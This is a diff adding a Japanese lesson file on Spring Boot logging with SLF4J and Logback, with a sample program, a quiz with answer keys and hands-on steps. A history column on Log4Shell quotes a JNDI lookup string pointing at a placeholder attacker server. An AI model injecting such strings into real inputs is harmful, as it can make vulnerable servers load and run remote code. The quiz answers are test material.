@@ -1,3 +1,271 @@
 id: spring-logging
 title: ログ
-status: planned
+status: ready
+minutes: 15
+summary: System.out.println を卒業して SLF4J + Logback でログを出す。レベルの使い分け、{} と例外の渡し方、logging.level での絞り込み、個人情報を出さない作法まで。
+goals:
+  - System.out.println ではなくロガーを使う理由と、SLF4J(API)と Logback(実装)の関係を説明できる
+  - LoggerFactory.getLogger(自クラス.class) でロガーを作り、5つのログレベルを使い分けられる
+  - "プレースホルダ {} でメッセージを組み立て、例外を最後の引数に渡してスタックトレースを残せる"
+  - logging.level.<パッケージ> でレベルを絞り、logging.file.name でファイルに出力できる
+  - パスワードや個人情報をログに出さず、MDC でリクエストIDを付ける考え方を説明できる
+samples:
+  - title: "文字列連結と {} の違いを数えてみる"
+    description: |
+      SLF4J の「レベル判定」と「`{}` の遅延評価」をまねた小さなロガーで、`toString()` が何回呼ばれるかを数えます。
+      本物の SLF4J も同じ考え方で、レベルが無効なら `{}` に入れる文字列を作りません。連結版は、ログが出なくても毎回 `toString()` と連結が実行されます。
+    code: |
+      // SLF4J の「レベル判定」と「{} の遅延評価」をまねた、ごく小さなロガー
+      enum Level { TRACE, DEBUG, INFO, WARN, ERROR }
+
+      class MiniLogger {
+          final Level threshold;
+          MiniLogger(Level threshold) { this.threshold = threshold; }
+
+          boolean isEnabled(Level level) {
+              // enum は宣言順に並ぶので、設定レベル以上なら出す
+              return level.compareTo(threshold) >= 0;
+          }
+          // 連結済みの文字列を受け取る版
+          void debug(String message) {
+              if (isEnabled(Level.DEBUG)) {
+                  System.out.println("DEBUG " + message);
+              }
+          }
+          // {} 版:出すと決まってから toString する
+          void debug(String format, Object arg) {
+              if (isEnabled(Level.DEBUG)) {
+                  String text = format.replace("{}", String.valueOf(arg));
+                  System.out.println("DEBUG " + text);
+              }
+          }
+      }
+
+      // toString が呼ばれた回数を数えるクラス
+      class Order {
+          static int toStringCalls = 0;
+          final int id;
+          Order(int id) { this.id = id; }
+          @Override public String toString() {
+              toStringCalls++;
+              return "Order#" + id;
+          }
+      }
+
+      // ここを変えてみよう:Level.INFO を Level.DEBUG や Level.WARN に
+      // DEBUG にするとログが出て、{} 版でも toString が呼ばれるようになる
+      var log = new MiniLogger(Level.INFO);
+
+      for (int i = 1; i <= 5; i++) {
+          log.debug("連結で処理: " + new Order(i));
+      }
+      System.out.println("連結版の toString 呼び出し: " + Order.toStringCalls + " 回");
+
+      Order.toStringCalls = 0;
+      for (int i = 1; i <= 5; i++) {
+          log.debug("{} を処理", new Order(i));
+      }
+      System.out.println("{} 版の toString 呼び出し: " + Order.toStringCalls + " 回");
+quiz:
+  - question: |
+      `application.yml` が次の設定のとき、`com.example.shop.OrderService` のロガーで `log.debug(...)`・`log.info(...)`・`log.warn(...)`・`log.error(...)` を1回ずつ呼びました。出力されるのは?
+      ```yaml
+      logging:
+        level:
+          root: INFO
+          com.example: WARN
+      ```
+    choices: ["4行すべて", "INFO・WARN・ERROR の3行", "WARN・ERROR の2行", "ERROR の1行だけ"]
+    answer: 2
+    explanation: |
+      ロガー名 `com.example.shop.OrderService` は `com.example` に前方一致(ドット区切り)するので、`root` の INFO ではなく `com.example` の WARN が効きます。出力されるのは WARN **以上** なので、WARN と ERROR の2行です。
+      「INFO・WARN・ERROR の3行」は root の設定だけを見た場合。より具体的に一致した設定が優先される点がポイントです。
+  - question: |
+      DEBUG が無効(INFO に設定)のとき、次の行を実行すると `calcTotal(items)` は呼ばれる?
+      ```java
+      log.debug("合計: " + calcTotal(items));
+      ```
+    choices:
+      - "呼ばれる。メソッドの引数は呼び出し前に評価されるので、連結も calcTotal も実行される"
+      - "呼ばれない。SLF4J が DEBUG 無効を検知して、引数の評価を省略する"
+      - "呼ばれない。JIT コンパイラが不要な呼び出しを必ず削除する"
+      - "コンパイルエラーになる。debug には {} を含む文字列しか渡せない"
+    answer: 0
+    explanation: |
+      Java はメソッドを呼ぶ前に引数を全部評価します(正格評価)。`log.debug` の中でレベルが判定されるのは、`"合計: " + calcTotal(items)` が計算し終わった **後** です。そのため DEBUG が無効でも `calcTotal` は実行され、結果は捨てられます。
+      `log.debug("合計: {}", total)` なら連結や `toString()` は省けますが、`calcTotal(items)` を引数に書けばそれ自体はやはり呼ばれます。重い計算は `if (log.isDebugEnabled())` で囲みましょう。JIT が副作用のある呼び出しを勝手に消すことはありません。
+  - question: |
+      次のコードを実行したときのログ出力として正しいのは?(`e` は `new IllegalStateException("応答なし")`)
+      ```java
+      log.error("採点に失敗: {}", e);
+      ```
+    choices:
+      - "採点に失敗: java.lang.IllegalStateException: 応答なし(1行だけ)"
+      - "採点に失敗: 応答なし(1行だけ)"
+      - "コンパイルエラー(例外は {} に入れられない)"
+      - "採点に失敗: {} と表示され、その下にスタックトレース"
+    answer: 3
+    explanation: |
+      SLF4J は **最後の引数が Throwable なら、それを「例外」として扱い** スタックトレースを出します。その分 `{}` に入れる引数が無くなるので、メッセージは `採点に失敗: {}` のまま残ります(実際に Logback で確かめた出力です)。
+      正しくは `log.error("採点に失敗 id={}", id, e)` のように、`{}` の数だけ値を渡し、例外はその後ろに付けます。1行だけになるのは `"採点に失敗: " + e` と連結した場合で、スタックトレースが失われます。
+  - question: |
+      `com.example.payment.PaymentService` の DEBUG ログを見たくて `logging.level.com.example.payment: DEBUG` を設定しましたが、出てきません。原因として最も怪しいのは?
+      ```java
+      public class PaymentService {
+          private static final Logger log =
+              LoggerFactory.getLogger(OrderService.class);
+          ...
+      }
+      ```
+    choices:
+      - "Logger を static にしているので、設定が反映されない"
+      - "getLogger に別クラス(OrderService)を渡しているので、ロガー名が com.example.order.OrderService になっている"
+      - "logging.level にはクラス名まで書かないと効かない"
+      - "DEBUG ログは Spring Boot では一切出せない"
+    answer: 1
+    explanation: |
+      ロガー名は `getLogger` に渡したクラスの完全修飾名で決まります。コピペで `OrderService.class` のまま残っていると、ログは `com.example.order.OrderService` の名前で出るので、`com.example.payment` の設定は効きません。ログの出どころ表示も嘘になります。
+      `static final` で持つのは定番の書き方で問題ありません。`logging.level` はパッケージ単位(前方一致)で書けます。
+  - question: |
+      会員登録の処理で次のログを出しました。出力に含まれるのは?
+      ```java
+      record Member(String name, String email,
+                    String password) {}
+
+      var m = new Member("ハル", "haru@example.com", "p@ss1234");
+      log.info("会員登録: {}", m);
+      ```
+    choices:
+      - "会員登録: Member@1b6d3586 のようなハッシュ値だけ"
+      - "会員登録: Member[name=ハル](record は最初のフィールドだけ出す)"
+      - "会員登録: Member[name=ハル, email=haru@example.com, password=p@ss1234]"
+      - "会員登録: Member[name=ハル, email=haru@example.com, password=****](自動でマスクされる)"
+    answer: 2
+    explanation: |
+      record は `toString()` を自動生成し、**全フィールドを名前付きで出力** します。オブジェクトを丸ごとログに渡すと、パスワードもメールアドレスもそのまま残ります。自動マスクのような機能はありません。
+      ハッシュ値だけになるのは `toString()` をオーバーライドしていない普通のクラスの場合です。ログには必要な項目だけを選んで出し、個人情報はマスクしましょう。
+columns:
+  - type: genba
+    title: 2021年12月、世界中のエンジニアの冬休みを奪った「Log4Shell」
+    body: |
+      2021年12月、Java の有名なログライブラリ **Log4j 2** に、深刻度最高ランクの脆弱性(CVE-2021-44228、通称 Log4Shell)が見つかりました。ログに出すメッセージの中に `${jndi:ldap://攻撃者のサーバ/...}` という文字列があると、Log4j がそれを「置き換え指示」として解釈し、外部からプログラムを読み込んで実行してしまう、というものです。
+
+      怖いのは、**ユーザーが入力した文字列(ユーザー名や User-Agent ヘッダ)をログに出すだけで攻撃が成立した** ことです。ログを出していない Java アプリの方が珍しいので、世界中の現場が「うちのどこで Log4j を使っているか」の棚卸しに追われました。
+
+      Spring Boot の既定の構成は Logback なので、標準のままのアプリは直撃しませんでした(同梱の `log4j-to-slf4j` は窓口だけで、問題の本体 `log4j-core` は含まない)。それでも「依存ライブラリの中身を把握しておく」「ログに出す外部入力を信用しない」という教訓を業界全体に刻んだ事件です。
+  - type: trivia
+    title: SLF4J・Logback・Log4j は、同じ人が作った
+    body: |
+      Java のログの歴史は、ほぼ一人の開発者 **Ceki Gülcü** の歴史でもあります。
+
+      1. 1990年代後半、彼が中心になって **Log4j**(初代)を作り、Java のログの事実上の標準に
+      2. その後 Java 1.4 に標準の `java.util.logging` が入り、ライブラリごとにログ API がバラバラな時代に
+      3. それを束ねる窓口として **SLF4J** を作る(2005年ごろ)
+      4. Log4j の後継として、SLF4J をネイティブに実装した **Logback** を作る(2006年ごろ)
+
+      Spring Boot が「SLF4J + Logback」を既定にしているのは、この流れの到達点だからです。ちなみに現在の **Log4j 2** は Apache の別のメンバーが作り直したもので、初代 Log4j とは中身が別物です。名前が似ているので、会話では「2」まで付けて区別しましょう。
+  - type: mistake
+    title: 本番で DEBUG を出しっぱなしにしてディスクが満杯
+    body: |
+      障害調査のために本番の `logging.level` を DEBUG に上げ、そのまま戻し忘れる ―― よくある事故です。DEBUG は INFO の何十倍も出ることが珍しくなく、`org.hibernate.SQL` まで DEBUG にしていると、SQL 1本ごとに行が増えます。数日後、ディスクが満杯になってアプリごと止まりました。
+
+      防ぎ方は3つあります。
+
+      - レベルを上げるなら **パッケージを絞る**(`root` を DEBUG にしない)
+      - 環境変数(`LOGGING_LEVEL_COM_EXAMPLE_PAYMENT=DEBUG` など)で一時的に上げ、**戻す日時をチケットに書いておく**
+      - `logging.logback.rollingpolicy.max-file-size` や `total-size-cap` で、ログファイルの上限を決めておく
+
+      ループの中で INFO を出す、1リクエストで何十行も INFO を出す、というのも同じ病気の軽症版です。「このログ、1日に何行出る?」と見積もるクセをつけましょう。
+sts:
+  intro: |
+    STS で実際にロガーを使い、`logging.level` を変えて DEBUG ログが出る/出ないを確かめます。最後にログをファイルにも出します。
+    前回のレッスンで使った Spring Boot プロジェクト(例として、起動クラスが `com.example.demo.DemoApplication`)を使ってください。
+  steps:
+    - title: ロガーを宣言して5つのレベルで出す
+      detail: |
+        起動クラスに次のコードを追加します(前回の `showGreeting` とは別の `@Bean` として足して構いません)。
+
+        ```java
+        private static final Logger log =
+            LoggerFactory.getLogger(DemoApplication.class);
+
+        @Bean
+        CommandLineRunner logDemo() {
+            return args -> {
+                log.trace("TRACE: いちばん細かい");
+                log.debug("DEBUG: 調査用の詳細");
+                log.info("INFO: 業務の節目");
+                log.warn("WARN: 要注意");
+                log.error("ERROR: 失敗した");
+            };
+        }
+        ```
+
+        **Ctrl+Shift+O**(インポートの編成)を押すと `Logger` の候補が複数出ます。必ず **`org.slf4j.Logger`** を選んでください。
+        `java.util.logging.Logger` などを選ぶと `LoggerFactory.getLogger` の戻り値と型が合わずコンパイルエラーになります。
+    - title: 既定(INFO)で起動して、出る行を確かめる
+      detail: |
+        **Run As > Spring Boot App**(実行 > Spring Boot アプリケーション)で起動します。**Console**(コンソール)に INFO・WARN・ERROR の3行だけが出て、TRACE と DEBUG は出ていなければ成功です。
+        各行に日時・レベル・スレッド名(`[main]`)・ロガー名(`c.example.demo.DemoApplication` のように短縮されることがあります)が付いていることも見てください。
+    - title: logging.level で DEBUG を出す
+      detail: |
+        `src/main/resources/application.yml` に追記します。
+
+        ```yaml
+        logging:
+          level:
+            com.example.demo: DEBUG
+        ```
+
+        保存して再起動すると、DEBUG の行も出るようになります(TRACE はまだ出ません)。
+        Boot Dashboard でアプリを選び、**(Re)start** ボタン(丸い矢印)を押すと手早く再起動できます。
+        続けて値を `TRACE` にすれば5行すべて、`ERROR` にすれば1行だけになることも確かめましょう。
+    - title: コードを変えずに起動時の引数で上書きする
+      detail: |
+        `application.yml` の値を `INFO` に戻してから、**Run > Run Configurations...**(実行 > 実行構成...)を開き、アプリを選んで **Arguments**(引数)タブの **Program arguments**(プログラムの引数)に
+        `--logging.level.com.example.demo=DEBUG` と書いて **Run**。ファイルを書き換えなくても DEBUG が出ることを確認します(前回やった優先順位のとおりです)。
+        確認したら引数を消して **Apply**(適用)しておきます。
+    - title: 例外のログを比べる
+      detail: |
+        `logDemo` の中に次の2行を足して再起動します。
+
+        ```java
+        var e = new IllegalStateException("わざと失敗");
+        log.error("連結で渡す: " + e);
+        log.error("最後の引数で渡す id={}", 42, e);
+        ```
+
+        1つ目は1行だけ、2つ目はその下に `at com.example.demo....` で始まるスタックトレースが続くはずです。
+        Console のスタックトレースの青いリンク(`DemoApplication.java:25` など)をクリックすると、例外が作られた行にエディタがジャンプします。
+    - title: ログをファイルにも出す
+      detail: |
+        `application.yml` に追記します。
+
+        ```yaml
+        logging:
+          file:
+            name: logs/demo.log
+        ```
+
+        再起動したら、**Package Explorer**(パッケージ・エクスプローラー)でプロジェクトを右クリックして **Refresh**(更新、**F5**)。
+        プロジェクト直下に `logs/demo.log` ができ、Console と同じ形式の行が書かれていれば成功です。
+        ログファイルを Git に入れないよう、プロジェクト直下の `.gitignore` に `logs/` の1行を足しておきましょう。
+    - title: (JPA を使っているプロジェクトなら)発行される SQL を見る
+      detail: |
+        Spring Data JPA のレッスンで作ったプロジェクトでは、`logging.level.org.hibernate.SQL: DEBUG` を足して画面を操作してみてください。
+        Repository のメソッドを呼ぶたびに、実際に発行された `select ...` の SQL がログに出ます。「思ったより SQL が多い」問題(N+1)を見つける第一歩です。確認が終わったら設定は消しておきましょう。
+checklist:
+  - key: slf4j-logger
+    text: org.slf4j.Logger をインポートして LoggerFactory.getLogger(自クラス.class) でロガーを作れた
+  - key: default-info
+    text: 既定の設定では INFO・WARN・ERROR だけが出て、DEBUG と TRACE が出ないことを確認した
+  - key: level-debug
+    text: logging.level.<パッケージ> を DEBUG / TRACE / ERROR に変えて、出る行が変わることを確かめた
+  - key: level-arg
+    text: Run Configurations の Program arguments で --logging.level... を渡し、ファイルを変えずにレベルを上げられた
+  - key: exception-log
+    text: 例外を連結で渡した場合と最後の引数で渡した場合を比べ、スタックトレースが出るのは後者だけだと確認した
+  - key: log-file
+    text: logging.file.name でログをファイルに出し、logs/ を .gitignore に追加した
+  - key: no-secrets
+    text: 自分のコードのログに、パスワードや個人情報(record の丸ごと出力を含む)が出ていないか見直した
